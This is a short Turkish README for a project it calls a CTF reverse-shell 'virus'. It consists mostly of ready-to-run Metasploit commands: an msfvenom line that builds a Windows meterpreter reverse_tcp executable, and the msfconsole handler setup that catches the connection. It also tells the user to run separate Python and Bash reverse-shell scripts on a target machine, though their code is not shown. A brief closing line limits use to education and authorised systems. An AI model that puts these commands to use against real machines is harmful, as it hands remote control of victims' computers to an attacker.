# CTF Virus Program

Bu proje, **Metasploit** ve **Python** kullanarak oluşturulmuş basit bir **reverse shell** virüs programıdır. **Metasploit Framework** ile **payload** oluşturulup, Python ya da Bash ile hedef sisteme bağlanacak bir script yazılmıştır.

## Kullanım

1. **Payload Oluşturma**:
   Metasploit'i kullanarak reverse shell payload'ı oluşturabilirsiniz:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f exe > payload.exe

   Dinleyici Başlatma: Dinleyici başlatmak için Metasploit Console üzerinden:

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run

Python Reverse Shell: Aşağıdaki Python kodunu hedef makineye çalıştırarak, bir reverse shell bağlantısı oluşturabilirsiniz:

python python_reverse_shell.py

Bash Reverse Shell: Alternatif olarak, aşağıdaki Bash scriptini kullanabilirsiniz:

    bash bash_reverse_shell.sh

Dikkat: Bu scriptler yalnızca eğitim ve test amaçlı kullanılmalıdır. Yalnızca izinli makinelerde kullanılmalıdır.
